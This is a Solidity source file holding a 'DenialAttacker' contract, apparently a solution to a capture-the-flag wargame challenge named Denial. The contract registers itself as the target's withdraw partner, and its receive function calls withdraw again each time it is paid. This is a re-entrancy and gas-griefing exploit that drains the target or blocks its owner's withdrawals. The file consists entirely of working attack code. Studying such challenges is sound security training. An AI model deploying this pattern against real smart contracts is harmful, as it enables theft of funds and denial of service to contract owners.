// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint);
}

contract DenialAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IDenial(challengeInstance).setWithdrawPartner(address(this));
    }

    receive() external payable {
        IDenial(msg.sender).withdraw();
    }
}